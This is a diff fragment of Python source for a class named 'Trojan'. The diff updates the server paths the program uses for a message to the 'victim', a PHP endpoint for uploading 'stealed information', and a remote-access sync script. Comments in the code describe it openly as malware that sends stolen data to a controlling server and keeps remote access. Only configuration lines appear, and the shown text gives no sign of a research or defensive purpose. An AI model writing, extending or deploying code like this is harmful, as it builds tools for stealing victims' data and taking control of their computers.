@@ -59,13 +59,13 @@ class Trojan:
         ]
 
         # Relative URL to the file on the server, where we storing message.
-        self.__server_message_file = "/victim_message.html"
+        self.__server_message_file = "/victim/victim_message.html"
 
         # Relative URL to the script file on the server, which will be used as form to send stealed information.
-        self.__server_script_stealed_information_file = "/stealed_information.php"
+        self.__server_script_stealed_information_file = "/victim/stealer_information_upload.php"
 
         # Relative URL to the script file on the server, which will be used as remote access synchronisation.
-        self.__server_script_remote_access_file = "/remote_access.php"
+        self.__server_script_remote_access_file = "/victim/remote_access_sync.php"
 
         # Should we show victim a message or not.
         self.__setting_show_message = False
